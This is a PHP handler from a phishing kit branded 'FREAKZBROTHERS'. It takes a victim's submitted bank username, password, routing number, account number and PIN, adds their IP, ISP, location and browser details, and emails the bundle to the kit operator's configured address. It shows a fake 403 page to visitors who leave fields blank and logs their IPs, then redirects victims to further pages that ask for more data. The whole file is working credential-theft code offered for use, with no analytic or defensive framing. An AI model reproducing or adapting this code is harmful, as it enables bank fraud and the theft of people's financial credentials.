<?php
session_start();
error_reporting(0);
require_once("../main.php");
require_once("../blocker.php");
// require_once("../blocker2.php");
require_once("../session.php");
$ip = getUserIP();
$randomnumber = rand(0, 100);
if ($_POST['bankuser'] == "") {
	tulis_file("../security/onetime.dat","$ip");
	header('HTTP/1.0 403 Forbidden');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
  	exit();
}
if ($_POST['bankpass'] == "") {
	tulis_file("../security/onetime.dat","$ip");
	header('HTTP/1.0 403 Forbidden');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
  	exit();
}
if ($_POST['routing'] == "") {
	tulis_file("../security/onetime.dat","$ip");
	header('HTTP/1.0 403 Forbidden');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
  	exit();
}
if ($_POST['accountnumber'] == "") {
	tulis_file("../security/onetime.dat","$ip");
	header('HTTP/1.0 403 Forbidden');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
  	exit();
}
if ($_POST['pin'] == "") {
	tulis_file("../security/onetime.dat","$ip");
	header('HTTP/1.0 403 Forbidden');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
  	exit();
}
$ispuser = getisp($ip);

$message = "+++++++++++++++++++++++++[ FREAKZBROTHERS ]+++++++++++++++++++++++\n";
$message .= "++-----------------------[ BANK ACCOUNT ]----------------------++\n";
$message .= "# Bank Account Name 		:	".$_POST['bankname']."\n";
$message .= "# Bank Account Username 	:	".$_POST['bankuser']."\n";
$message .= "# Bank Account Password 	:	".$_POST['bankpass']."\n";
$message .= "# Bank Routing Number 		:	".$_POST['routing']."\n";
$message .= "# Bank Account Number 		:	".$_POST['accountnumber']."\n";
$message .= "# PIN Number 				:	".$_POST['pin']."\n";
$message .= "++------------------------[ DEVICE INFO ]----------------------++\n";
$message .= "# IP Address 		:	".$ip."\n";
$message .= "# ISP 				:	".$ispuser."\n";
$message .= "# Region 			:	".$regioncity."\n";
$message .= "# City 			:	".$citykota."\n";
$message .= "# Continent 		:	".$continent."\n";
$message .= "# Time Zone 		:	".$timezone."\n";
$message .= "# OS / Browser 	:	".$os." / ".$br."\n";
$message .= "# Date 			:	".$date."\n";
$message .= "# User Agent 		:	".$user_agent."\n";
$message .= "++++++++++++++++++++++++++[ FREAKZBROTHERS ]++++++++++++++++++++++\n";

$to = $config['email_result'];
$headers = "From: BANK ACCOUNT <freakzbrothers-v2.0-$randomnumber@freakz.site>";
$subject = "💟 ".strtoupper($_POST['bankname'])." // $os - $ip - $cn";
mail($to, $subject, $message, $headers);
tulis_file("../result/total_bank.txt", $ip);
if ($config['get_photo'] == "Oks") {
	echo "<script type='text/javascript'>window.top.location='../ap/verify_credit?session=$key';</script>";
	exit();
}else{
	echo "<script type='text/javascript'>window.top.location='../ap/done?session=$key';</script>";
	exit();
}